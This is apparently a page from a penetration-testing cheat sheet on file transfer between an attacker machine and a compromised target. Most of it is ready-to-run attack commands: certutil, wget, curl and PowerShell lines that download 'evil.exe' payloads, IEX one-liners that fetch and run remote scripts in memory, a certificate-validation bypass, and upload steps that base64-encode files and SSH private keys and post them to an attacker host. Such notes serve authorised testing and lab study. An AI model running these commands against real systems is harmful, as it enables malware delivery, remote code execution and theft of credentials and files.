---
title: File Transfer
parent: General Usage
layout: default
nav_order: 17
---

## Download
1. Certutil:\
   `certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`
2. Wget with directory set:\
   `wget -P /tmp http://IP/file`
3. Curl:\
   `curl http://attacker:3333/file -o /tmp/file`
4. Python server on attacker machine:\
   `python3 -m http.server 8000`
5. Powershell on target (single line):\
   `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://IP/evil.exe', 'shell1.exe')`
6. Powershell on target (line by line):\
   `echo $webclient = New-Object System.Net.WebClient >>wget.ps1`\
   `echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1`\
   `echo $file = "new-exploit.exe" >>wget.ps1`\
   `echo $webclient.DownloadFile($url,$file) >>wget.ps1`\
   `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`
7. Powershell (execute directly without download):\
   `powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')`
8. UPX and Powershell (reconstruct instead of download):\
   attacker: `upx -9 evil.exe`\
   attacker: `exe2hex -x evil.exe -p evil.cmd`\
   attacker: `cat evil.cmd`\
   victim: copy the powershell command near the end of evil.cmd will recreate the evil.exe
9. TFTP (Windows XP/2003 and earlier default).\
   Kali: `atftpd --daemon --port 69 /tmp/tftp`, then `/etc/init.d/atftpd restart`\
   Victim: `tftp -i kaliIP GET/PUT file`
10. (Windows)Powershell to download:\
    `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`\
    If got SSL/TLS issue, use:\
    `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

## Upload
1. Start Apache server (`sudo service apache2 start`), and then use `powershell (New-Object System.Net.WebClient).UploadFile('http://IP/upload321.php', 'important.docx')` to upload.
2. `scp -P port user@SRC_HOST:file1 user@DEST_HOST:file2`\
   (if copy to localhost no need put localhost, just use full path like /home/xxx/yyy)
3. (Windows)Do an upload server in Kali:\
   `pip3 install uploadserver`\
   Serve it on Kali:\
   `python3 -m uploadserver`\
   On target machine:\
   `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`\
   `Invoke-FileUpload -Uri http://KALIIP:8000/upload -File C:\testfile`
4. (Windows)Use nc to listen to the incoming request on Kali:\
   `nc -lvnp 8000`\
   Send these powershell on target:\
   `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\testfile' -Encoding Byte))`
   `Invoke-WebRequest -Uri http://KALIIP:8000/ -Method POST -Body $b64`
5. (Linux)Get the base64 content on target:\
   `cat id_rsa |base64 -w 0;echo`\
   Decode it on our Kali:\
   `echo -n 'LS0t...' | base64 -d > id_rsa`
6. (Linux)Use uploadserver:\
   `pip3 install uploadserver`\
   Create certificate:\
   `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
   Create a new folder for the certificate:\
   `mkdir https`\
   Use the certificate to start uploadserver:\
   `sudo python3 -m uploadserver 443 --server-certificate ~/https/server.pem`\
   From our target:\
   `curl -X POST https://KALIIP/upload -F 'files=@/home/testfile1' -F 'files=@/etc/testfile2' --insecure`
